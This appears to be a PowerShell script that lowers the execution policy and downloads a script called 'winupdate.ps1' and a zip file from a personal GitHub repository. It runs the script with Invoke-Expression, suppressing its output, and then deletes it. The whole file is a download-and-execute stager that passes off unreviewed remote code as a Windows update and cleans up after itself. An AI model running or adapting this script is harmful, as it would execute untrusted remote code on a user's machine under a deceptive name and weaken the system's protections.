Set-ExecutionPolicy RemoteSigned

Set-Location -Path $home\Downloads

wget https://raw.githubusercontent.com/mattiewae/test/master/winupdate.ps1 -OutFile winupdate.ps1
wget https://github.com/mattiewae/test/raw/master/Test.zip -OutFile test.zip

$ChkFile = "$home\Downloads\winupdate.ps1" 
$FileExists = Test-Path $ChkFile 
If ($FileExists -eq $True) {
Write-Host "File download success"
Invoke-Expression $home\Downloads\winupdate.ps1 | Out-Null
}

Write-Host "Update file removed"
Remove-Item $home\Downloads\winupdate.ps1